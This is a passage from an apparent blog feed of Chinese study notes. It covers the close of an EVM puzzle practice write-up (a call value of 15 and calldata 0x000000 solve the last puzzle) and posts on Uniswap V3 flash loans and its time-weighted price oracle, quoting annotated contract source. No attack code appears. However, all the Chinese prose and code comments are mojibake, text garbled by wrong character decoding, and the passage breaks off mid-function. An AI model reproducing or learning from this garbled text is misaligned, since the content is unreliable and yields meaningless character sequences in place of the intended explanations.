</span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#06"><strong>MOD</strong></a> ç”¨äºè®¡ç®—ç¬¬ä¸€ä¸ªå †æ ˆå…ƒç´ å’Œç¬¬äºŒä¸ªå †æ ˆå…ƒç´ çš„æ¨¡ï¼Œå³ a % b</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[calldatasize%3<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><a href="https://www.evm.codes/?ref=hackernoon.com#15"><strong>ISZERO</strong></a>ï¼Œå¦‚æœå †æ ˆä¸Šçš„æœ€é«˜å€¼ä¸º 0 ï¼Œåˆ™è¯¥æŒ‡ä»¤å°†æ¨é€ 1 åˆ°å †æ ˆä¸Šã€‚å¦‚æœä»»ä½•å…¶ä»–æ•°å­—ä½äºå †æ ˆé¡¶éƒ¨ï¼Œåˆ™å°†æ¨é€ 0 åˆ°å †æ ˆã€‚</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap">[ISZERO(calldatasize%3)<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0<span class="hljs-number"> 0 </span>0 0]<br></code></pre></td></tr></table></figure><p><strong>CALLVALUE</strong></p><p><strong>PUSH1 0A</strong></p><p><a href="https://www.evm.codes/?ref=hackernoon.com#01"><strong>ADD</strong></a> å‰ä¸¤ä¸ªå€¼ç›¸åŠ </p><p>ç„¶åéœ€è¦è·³è½¬åˆ° 0x19 å¤„ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦æ»¡è¶³æ¡ä»¶</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">calldatasize</span> % <span class="hljs-number">3</span> == <span class="hljs-number">0</span><br><span class="hljs-attribute">0x0a</span> + callvalue = <span class="hljs-number">0</span>x<span class="hljs-number">19</span> // <span class="hljs-number">10</span> + <span class="hljs-number">15</span> = <span class="hljs-number">25</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘è¾“å…¥</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">? Enter <span class="hljs-keyword">the</span> <span class="hljs-built_in">value</span> <span class="hljs-built_in">to</span> <span class="hljs-built_in">send</span>: <span class="hljs-number">15</span><br>? Enter <span class="hljs-keyword">the</span> calldata: <span class="hljs-number">0x000000</span><br></code></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæ‰€æœ‰ Puzzle éƒ½å®Œæˆäº†</p>]]></content>
    
    
    
    <tags>
      
      <tag>é¶åœºåˆ·é¢˜</tag>
      
      <tag>EVM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uniswap Part â…¥ | é—ªç”µè´·</title>
    <link href="/2022/09/29/uniswap-v3-6/"/>
    <url>/2022/09/29/uniswap-v3-6/</url>
    
    <content type="html"><![CDATA[<h1 id="é—ªç”µè´·"><a href="#é—ªç”µè´·" class="headerlink" title="é—ªç”µè´·"></a>é—ªç”µè´·</h1><ul><li>ç¬¬ä¸€ç§æ˜¯æ™®é€šçš„é—ªç”µè´·ï¼Œå³å€Ÿå…¥ token å’Œè¿˜è´· token ç›¸åŒï¼Œé€šè¿‡ <code>UniswapV3Pool.flash()</code> å®Œæˆ</li><li>ç¬¬äºŒç§æ˜¯ç±»ä¼¼ v2 çš„ <code>flash swap</code>ï¼Œå³å€Ÿå…¥ token å’Œè¿˜è´· token ä¸åŒï¼Œè¿™ä¸ªæ˜¯é€šè¿‡ <code>UniswapV3Pool.swap()</code> æ¥å®Œæˆçš„ã€‚</li></ul><h3 id="flash"><a href="#flash" class="headerlink" title="flash"></a>flash</h3><p>æ™®é€šé—ªç”µè´·çš„æ¥å£ä¸ºäº¤æ˜“æ± åˆçº¦çš„ <code>UniswapV3Pool.flash()</code> å‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function flash(<br>    address recipient,  // å€Ÿè´·æ–¹åœ°å€ï¼Œç”¨äºè°ƒç”¨å›è°ƒå‡½æ•°<br>    uint256 amount0, // å€Ÿè´·çš„ token0 çš„æ•°é‡<br>    uint256 amount1, // å€Ÿè´·çš„ token1 çš„æ•°é‡<br>    bytes calldata data //å›è°ƒå‡½æ•°çš„å‚æ•°<br>) external override lock noDelegateCall &#123;<br>    uint128 _liquidity = liquidity;<br>    require(_liquidity &gt; 0, &#x27;L&#x27;);<br><br>    // è®¡ç®—å€Ÿè´·æ‰€éœ€è¦æ‰£é™¤çš„æ‰‹ç»­è´¹<br>    uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e6);<br>    uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e6);<br>    // è®°å½•ä¸‹å½“å‰çš„ä½™é¢<br>    uint256 balance0Before = balance0();<br>    uint256 balance1Before = balance1();<br><br>    // å°†æ‰€éœ€ token å‘é€ç»™å€Ÿè´·æ–¹<br>    if (amount0 &gt; 0) TransferHelper.safeTransfer(token0, recipient, amount0);<br>    if (amount1 &gt; 0) TransferHelper.safeTransfer(token1, recipient, amount1);<br><br>    // è°ƒç”¨å€Ÿè´·æ–¹åœ°å€çš„å›è°ƒå‡½æ•°ï¼Œå°†å‡½æ•°ç”¨æˆ·ä¼ å…¥çš„ data å‚æ•°ä¼ ç»™è¿™ä¸ªå›è°ƒå‡½æ•°<br>    IUniswapV3FlashCallback(msg.sender).uniswapV3FlashCallback(fee0, fee1, data);<br><br>    // è®°å½•è°ƒç”¨å®Œæˆåçš„ä½™é¢<br>    uint256 balance0After = balance0();<br>    uint256 balance1After = balance1();<br><br>    // æ¯”å¯¹å€Ÿå‡ºä»£å¸å‰å’Œå›è°ƒå‡½æ•°è°ƒç”¨å®Œæˆåä½™é¢çš„æ•°é‡ï¼Œå¯¹äºæ¯ä¸ª tokenï¼Œä½™é¢åªèƒ½å¤šä¸èƒ½å°‘<br>    require(balance0Before.add(fee0) &lt;= balance0After, &#x27;F0&#x27;);<br>    require(balance1Before.add(fee1) &lt;= balance1After, &#x27;F1&#x27;);<br><br>    // sub is safe because we know balanceAfter is gt balanceBefore by at least fee<br>    // æ‰‹ç»­è´¹ç›¸å…³çš„è®¡ç®—<br>    uint256 paid0 = balance0After - balance0Before;<br>    uint256 paid1 = balance1After - balance1Before;<br><br>    if (paid0 &gt; 0) &#123;<br>        uint8 feeProtocol0 = slot0.feeProtocol % 16;<br>        uint256 fees0 = feeProtocol0 == 0 ? 0 : paid0 / feeProtocol0;<br>        if (uint128(fees0) &gt; 0) protocolFees.token0 += uint128(fees0);<br>        feeGrowthGlobal0X128 += FullMath.mulDiv(paid0 - fees0, FixedPoint128.Q128, _liquidity);<br>    &#125;<br>    if (paid1 &gt; 0) &#123;<br>        uint8 feeProtocol1 = slot0.feeProtocol &gt;&gt; 4;<br>        uint256 fees1 = feeProtocol1 == 0 ? 0 : paid1 / feeProtocol1;<br>        if (uint128(fees1) &gt; 0) protocolFees.token1 += uint128(fees1);<br>        feeGrowthGlobal1X128 += FullMath.mulDiv(paid1 - fees1, FixedPoint128.Q128, _liquidity);<br>    &#125;<br><br>    emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);<br>&#125;<br></code></pre></td></tr></table></figure><p>å®Œæ•´flashä»£ç å¯ä»¥å‚è€ƒ<a href="https://docs.uniswap.org/protocol/guides/flash-integrations/final-contract">å®˜æ–¹</a></p><h3 id="flash-swap"><a href="#flash-swap" class="headerlink" title="flash swap"></a>flash swap</h3><p>é€šè¿‡ <code>UniswapV3Pool.swap()</code> å‡½æ•°ï¼Œå¯ä»¥å®Œæˆ <code>flashswap</code> çš„åŠŸèƒ½</p><p>å…¶ä¸­ï¼Œåœ¨ä½¿ç”¨ <code>flashswap</code> æ—¶ï¼Œéœ€è¦å®ç°å…¶ <code>IUniswapV3SwapCallback</code> æ¥å£ï¼Œå®Œæˆé—ªç”µè´·çš„è¿˜è´·</p>]]></content>
    
    
    
    <tags>
      
      <tag>Etherum</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Uniswap Part â…¤ | é¢„è¨€æœº</title>
    <link href="/2022/09/29/uniswap-v3-5/"/>
    <url>/2022/09/29/uniswap-v3-5/</url>
    
    <content type="html"><![CDATA[<h1 id="é¢„è¨€æœºçš„å®ç°"><a href="#é¢„è¨€æœºçš„å®ç°" class="headerlink" title="é¢„è¨€æœºçš„å®ç°"></a>é¢„è¨€æœºçš„å®ç°</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p><a href="https://learnblockchain.cn/article/3960">UniswapV2çš„é¢„è¨€æœº</a>ç§°ä¸º <strong>TWAPï¼ˆTime-Weighted Average Priceï¼‰</strong> ï¼Œå³<strong>æ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼</strong> ã€‚å±äºæ˜¯ <strong>é“¾ä¸Šé¢„è¨€æœº</strong> </p><p>UniswapV3 çš„å®ç°æœºåˆ¶å’Œ UniswapV2 æœ‰å¾ˆå¤§ä¸åŒ</p><ul><li><p>åœ¨è®¡ç®— TWAP çš„æ•°æ®æºæ–¹é¢ï¼ŒUniswapV2 åªå­˜å‚¨äº†æœ€æ–°çš„ <strong>price0CumulativeLast</strong> ã€<strong>price1CumulativeLast</strong> å’Œ <strong>blockTimestampLast</strong> ä¸‰ä¸ªå€¼è€Œå·²ã€‚è€Œ UniswapV3 åˆ™æ”¹ä¸ºç”¨ä¸€ä¸ªå®¹é‡å¯è¾¾ 65535 çš„æ•°ç»„æ¥å­˜å‚¨å†å²æ•°æ®ï¼Œå³ <strong>UniswapV3Pool</strong> åˆçº¦çš„ <strong>observations</strong> çŠ¶æ€å˜é‡ï¼Œè¿™æ ·ç¬¬ä¸‰æ–¹å¼€å‘è€…ä¸å†éœ€è¦è‡ªå·±å®ç°åˆçº¦å­˜å‚¨å†å²ä¿¡æ¯ã€‚</p></li><li><p>è§¦å‘æ•°æ®çš„å­˜å‚¨ä¸å†éœ€è¦é“¾ä¸‹ç¨‹åºå»å®šæ—¶è§¦å‘ï¼Œè€Œæ˜¯åœ¨ Uniswap å‘ç”Ÿäº¤æ˜“æ—¶è‡ªåŠ¨è§¦å‘ã€‚</p></li><li><p>Oracle ä¸­ä¸å…‰è®°å½•äº†ä»·æ ¼ä¿¡æ¯ï¼Œè¿˜è®°å½•äº†å¯¹åº”æµåŠ¨æ€§çš„æ—¶é—´ç´¯ç§¯å€¼ï¼Œå› ä¸º v3 ä¸­ç›¸åŒäº¤æ˜“å¯¹åœ¨ä¸åŒè´¹ç‡æ—¶æ—¶ä¸åŒçš„äº¤æ˜“æ± ï¼Œè¿™æ ·åœ¨ä½¿ç”¨ Oracle æ—¶ï¼Œå¯ä»¥é€‰æ‹©æµåŠ¨æ€§è¾ƒå¤§çš„æ± æœ€ä¸ºä»·æ ¼å‚è€ƒæ¥æº</p></li><li><p>Uniswap v2 ä¸­å¯ä»¥è®¡ç®—å‡ºæ—¶é—´åŠ æƒå¹³å‡ä»·æ ¼ï¼ˆç®—æœ¯å¹³å‡å€¼ï¼‰ï¼Œè€Œ v3 ä¸­è®¡ç®—å‡ºæ¥çš„æ˜¯æ—¶é—´åŠ æƒä»·æ—¶å‡ ä½•å¹³å‡å€¼</p><p>ç®—æœ¯å¹³å‡æ•°çš„ä¼˜åŠ¿æ˜¯å…¶ç®€å•æ€§ï¼Œä¹Ÿæ˜¯æœ€ç¬¦åˆç›´è§‰çš„å¹³å‡æ•°ã€‚å½“ç”¨äºè®¡ç®—ç®—æœ¯å¹³å‡æ•°çš„æ•°æ®ç³»åˆ—è¶Šé•¿ï¼Œå…¶ç®—æœ¯å¹³å‡å€¼å°±æœ‰è¶Šé«˜çš„æœºç‡æ¥è¿‘æœŸæœ›å€¼ï¼Œè¿™ç§ç°è±¡åœ¨ç»Ÿè®¡å­¦ä¸­è¢«ç§°ä¸º<a href="https://zh.wikipedia.org/zh-hans/%E5%A4%A7%E6%95%B0%E5%AE%9A%E5%BE%8B">ã€Œå¤§æ•°æ³•åˆ™ã€</a>ã€‚</p><p>å‡ ä½•å¹³å‡æ•°ä¸€èˆ¬æ¥è¯´éƒ½ä¼šå°äºç®—æœ¯å¹³å‡æ•°ï¼Œå› æ­¤ä½†æ˜¯å¯¹äºæ³¢åŠ¨è¾ƒå¤§çš„æ•°å­—è€Œè¨€ï¼Œä½¿ç”¨å‡ ä½•å¹³å‡æ•°ï¼Œå…¶å—æ³¢åŠ¨æ€§çš„å½±å“ä¼šæ›´å°ã€‚</p></li></ul><h2 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h2><p>Oracle å®ç°çš„ä»£ç éƒ½åœ¨ <a href="https://github.com/Uniswap/v3-core">uniswap-v3-core</a> çš„åˆçº¦ä¸­å®ç°ã€‚</p><h3 id="å­˜å‚¨"><a href="#å­˜å‚¨" class="headerlink" title="å­˜å‚¨"></a>å­˜å‚¨</h3><p>åœ¨ <strong>Oracle</strong> åº“ä¸­ï¼Œå®šä¹‰äº†æ•°æ®ç»“æ„ <strong>Observation</strong> ï¼Œå³å­˜å‚¨é¢„è¨€æœºæ•°æ®çš„æ•°æ®ç»“æ„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs solidity">struct Observation &#123;<br>        // the block timestamp of the observation<br>        // åŒºå—çš„æ—¶é—´æˆ³<br>        uint32 blockTimestamp;<br>        // the tick accumulator, i.e. tick * time elapsed since the pool was first initialized<br>        // tick index çš„æ—¶é—´åŠ æƒç´¯ç§¯å€¼<br>        // è‡ªæ± å­åˆ›å»ºä¹‹åçš„ tick * time çš„ç´¯è®¡å€¼<br>        int56 tickCumulative;<br>        // the seconds per liquidity, i.e. seconds elapsed / max(1, liquidity) since the pool was first initialized<br>        uint160 secondsPerLiquidityCumulativeX128;<br>        // whether or not the observation is initialized<br>        // æ˜¯å¦å·²ç»è¢«åˆå§‹åŒ–<br>        bool initialized;<br>    &#125;<br></code></pre></td></tr></table></figure><p>åœ¨äº¤æ˜“æ± çš„åˆçº¦ä¸­ï¼Œä½¿ç”¨ä¸€ä¸ªæ•°ç»„æ¥å­˜å‚¨äº¤æ˜“æ± æœ€è¿‘çš„çš„ Oracle æ•°æ®ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract UniswapV3Pool is IUniswapV3Pool, NoDelegateCall &#123;<br>    ...<br>    // Oracle ç›¸å…³æ“ä½œçš„åº“<br>    using Oracle for Oracle.Observation[65535];<br>    ...<br>    struct Slot0 &#123;<br>    // å½“å‰çš„æ ¹å·ä»·æ ¼<br>        uint160 sqrtPriceX96;<br>        // å½“å‰ä»·æ ¼å¯¹åº”çš„ä»·æ ¼ç‚¹<br>    int24 tick;<br>        // è®°å½•äº†æœ€è¿‘ä¸€æ¬¡ Oracle è®°å½•åœ¨ Oracle æ•°ç»„ä¸­çš„ç´¢å¼•ä½ç½®<br>        uint16 observationIndex;<br>        // å·²ç»å­˜å‚¨çš„ Oracle æ•°é‡<br>        uint16 observationCardinality;<br>        // å¯ç”¨çš„ Oracle ç©ºé—´ï¼Œæ­¤å€¼åˆå§‹æ—¶ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œåç»­æ ¹æ®éœ€è¦æ¥å¯ä»¥æ‰©å±•<br>        uint16 observationCardinalityNext;<br>        ...<br>    &#125;<br>    Slot0 public override slot0;<br>    ...<br>    // ä½¿ç”¨æ•°æ®è®°å½• Oracle çš„å€¼<br>    // æ˜¯ä¿å­˜ Oracle ä¸­å®šä¹‰çš„ Observation ç»“æ„ä½“çš„æ•°ç»„<br>    Oracle.Observation[65535] public override observations;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ•°ç»„çš„å¤§å°ä¸º 65535ï¼Œä½†æ˜¯å®é™…ä¸Šåœ¨åˆå§‹é˜¶æ®µè¿™ä¸ªæ•°æ®å¹¶ä¸ä¼šè¢«å…¨éƒ¨ä½¿ç”¨ï¼Œè€Œä»…ä½¿ç”¨å…¶ä¸­ä¸€éƒ¨åˆ†ç©ºé—´ï¼ˆåˆå§‹ä¸º 1ï¼ŒobservationCardinality ä¸º 1ï¼Œå³ observations å®é™…å®¹é‡åªæœ‰ 1ï¼Œä¸€ç›´éƒ½åªæ›´æ–°ç¬¬ä¸€ä¸ªå…ƒç´ ï¼‰ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ï¼Œå¦‚æœæ²¡æœ‰å¿…è¦ï¼Œé‚£ä¹ˆä»…å­˜å‚¨æœ€è¿‘ä¸€ä»½ Oracle æ•°æ®å³å¯ï¼Œå› ä¸ºå†™å…¥æ•°æ®åˆ°æ•°ç»„ä¸­éœ€è¦æ¯”è¾ƒé«˜æ˜‚çš„ gas è´¹ç”¨ï¼ˆ<code>SSTORE</code> æ“ä½œï¼‰ã€‚</p><p>å½“ç¬¬ä¸‰æ–¹å¯¹æŸä¸ªäº¤æ˜“æ± çš„ Oracle æœ‰éœ€æ±‚æ—¶ï¼Œå¯ä»¥ä¸»åŠ¨è°ƒç”¨åˆçº¦çš„æ¥å£æ‰©å±•è¿™ä¸ªæ•°æ®çš„å¯ç”¨ç©ºé—´ï¼Œè¿™æ ·åç»­åˆçº¦ä¼šå­˜å‚¨æ›´å¤šçš„ Oracle æ•°æ®ã€‚</p><p>å½“æ•°ç»„å¯ç”¨å¤§å°å†™æ»¡ä¹‹åï¼Œå®ƒä¼šé‡æ–°ä» 0 å¼€å§‹å†™å…¥ï¼Œå³ä½¿ç”¨ä¸Šç±»ä¼¼ä¸€ä¸ª ring buffer(ç¯å½¢ç¼“å†²åŒº)ã€‚</p><h3 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h3><p>åˆ›å»ºäº¤æ˜“å¯¹æ—¶ï¼Œ<code>UniswapV3Factory</code> ä¼šè°ƒç”¨æ–°åˆ›å»ºäº¤æ˜“å¯¹çš„ <code>UniswapV3Pool.initialize()</code> å‡½æ•°å¯¹åˆçº¦è¿›è¡Œåˆå§‹åŒ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function initialize(uint160 sqrtPriceX96) external override &#123;<br>        require(slot0.sqrtPriceX96 == 0, &#x27;AI&#x27;);<br><br>        int24 tick = TickMath.getTickAtSqrtRatio(sqrtPriceX96);<br><br>        // åˆå§‹åŒ–Oracle <br>        (uint16 cardinality, uint16 cardinalityNext) = observations.initialize(_blockTimestamp());<br><br>        slot0 = Slot0(&#123;<br>            sqrtPriceX96: sqrtPriceX96,<br>            tick: tick,<br>            observationIndex: 0,<br>            observationCardinality: cardinality,<br>            observationCardinalityNext: cardinalityNext,<br>            feeProtocol: 0,<br>            unlocked: true<br>        &#125;);<br><br>        emit Initialize(sqrtPriceX96, tick);<br>    &#125;<br></code></pre></td></tr></table></figure><p>åœ¨åˆå§‹åŒ–çš„ä»£ç ä¸­ï¼Œè°ƒç”¨äº† <code>observations.initialize(_blockTimestamp())</code> æ¥è¿›è¡Œ Oracle çš„åˆå§‹åŒ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function initialize(Observation[65535] storage self, uint32 time)<br>    internal<br>    returns (uint16 cardinality, uint16 cardinalityNext)<br>&#123;<br>    self[0] = Observation(&#123;<br>        blockTimestamp: time,<br>        tickCumulative: 0,<br>        secondsPerLiquidityCumulativeX128: 0,<br>        initialized: true<br>    &#125;);<br>    // è¿”å›å½“å‰ Oracle çš„ä¸ªæ•°å’Œæœ€å¤§å¯ç”¨ä¸ªæ•°<br>    return (1, 1);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ€å¤§å¯ç”¨ä¸ªæ•°å³ <code>cardinalityNext</code> ä¸º 1ï¼Œè¡¨ç¤ºåˆçº¦åˆå§‹åŒ–æ—¶ï¼Œåªä¼šè®°å½•æœ€è¿‘çš„ä¸€æ¬¡ Oracle æ•°æ®ã€‚</p><h3 id="æ›´æ–°"><a href="#æ›´æ–°" class="headerlink" title="æ›´æ–°"></a>æ›´æ–°</h3><p>Oracle æ•°æ®çš„æ›´æ–°å‘ç”Ÿåœ¨ä»·æ ¼å˜åŠ¨çš„æ—¶å€™ï¼Œä¸ºäº†é˜²æ­¢æ”»å‡»ï¼ˆæ”»å‡»è€…åœ¨åŒä¸€ä¸ªåŒºå—ä¸­ï¼Œåœ¨ Oracle å†™å…¥çš„å‰åå…ˆä¹°å…¥å†å–å‡ºæŸç§èµ„äº§ï¼Œä»¥å®ç°ä½æˆæœ¬æ“çºµ Oracle æ•°æ®çš„ç›®çš„ï¼‰ï¼ŒåŒä¸€ä¸ªåŒºå—å†…ï¼Œåªä¼šåœ¨ç¬¬ä¸€æ¬¡å‘ç”Ÿä»·æ ¼å˜åŠ¨æ—¶å†™å…¥ Oracle ä¿¡æ¯ã€‚åœ¨ <code>UniswapV3Pool.swap()</code> å‡½æ•°ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// update tick and write an oracle entry if the tick change<br>        // æ£€æŸ¥ä»·æ ¼æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–ï¼Œå½“ä»·æ ¼å˜åŒ–æ—¶ï¼Œéœ€è¦å†™å…¥ä¸€ä¸ª Oracle æ•°æ®<br>        if (state.tick != slot0Start.tick) &#123;<br>            // å†™å…¥ Oracle æ•°æ®<br>            (uint16 observationIndex, uint16 observationCardinality) =<br>                observations.write(<br>                    // äº¤æ˜“å‰çš„æœ€æ–° Oracle ç´¢å¼•<br>                    slot0Start.observationIndex,<br>                    // å½“å‰åŒºå—çš„æ—¶é—´<br>                    cache.blockTimestamp,<br>                    // äº¤æ˜“å‰çš„ä»·æ ¼çš„ tick ï¼Œç”¨äºé˜²æ­¢æ”»å‡»<br>                    slot0Start.tick,<br>                    //äº¤æ˜“å‰çš„ä»·æ ¼å¯¹åº”çš„æµåŠ¨æ€§<br>                    cache.liquidityStart,<br>                    // å½“å‰çš„ Oracle æ•°é‡<br>                    slot0Start.observationCardinality,<br>                    // å¯ç”¨çš„ Oracle æ•°é‡<br>                    slot0Start.observationCardinalityNext<br>                );<br>            // æ›´æ–°æœ€æ–° Oracle æŒ‡å‘çš„ç´¢å¼•ä¿¡æ¯ä»¥åŠå½“å‰ Oracle æ•°æ®çš„æ€»æ•°ç›®<br>            (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (<br>                state.sqrtPriceX96,<br>                state.tick,<br>                observationIndex,<br>                observationCardinality<br>            );<br>        &#125; else &#123;<br>            // otherwise just update the price<br>            slot0.sqrtPriceX96 = state.sqrtPriceX96;<br>        &#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œé¦–å…ˆæ£€æŸ¥ä»·æ ¼æ˜¯å¦å‘ç”Ÿäº†å˜åŒ–ï¼Œå½“ä»·æ ¼å˜åŒ–æ—¶ï¼Œéœ€è¦å†™å…¥ Oracle æ•°æ®ï¼Œè°ƒç”¨çš„æ˜¯ <code>observations.write</code> å‡½æ•°ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function write(<br>        Observation[65535] storage self,<br>        uint16 index,<br>        uint32 blockTimestamp,<br>        int24 tick,<br>        uint128 liquidity,<br>        uint16 cardinality,<br>        uint16 cardinalityNext<br>    ) internal returns (uint16 indexUpdated, uint16 cardinalityUpdated) &#123;<br>        // è·å–å½“å‰çš„ Oracle æ•°æ®<br>        Observation memory last = self[index];<br><br>        // early return if we&#x27;ve already written an observation this block<br>        // åŒä¸€ä¸ªåŒºå—å†…ï¼Œåªä¼šåœ¨ç¬¬ä¸€ç¬”äº¤æ˜“ä¸­å†™å…¥ Oracle æ•°æ®<br>        // åœ¨ Layer1 ä¸­ï¼Œæ¯ä¸ªåŒºå—åªä¼šå‘ç”Ÿä¸€æ¬¡æ›´æ–° observations<br>        // è€Œåœ¨ Layer2ï¼Œå› ä¸ºæ—¶é—´æˆ³ 1 åˆ†é’Ÿæ‰ä¼šæ›´æ–°ä¸€æ¬¡ï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ 1 åˆ†é’Ÿæ‰ä¼šå‘ç”Ÿä¸€æ¬¡æ›´æ–° observationsã€‚<br>        if (last.blockTimestamp == blockTimestamp) return (index, cardinality);<br><br>        // if the conditions are right, we can bump the cardinality<br>        // æ£€æŸ¥æ˜¯å¦éœ€è¦ä½¿ç”¨æ–°çš„æ•°ç»„ç©ºé—´<br>        if (cardinalityNext &gt; cardinality 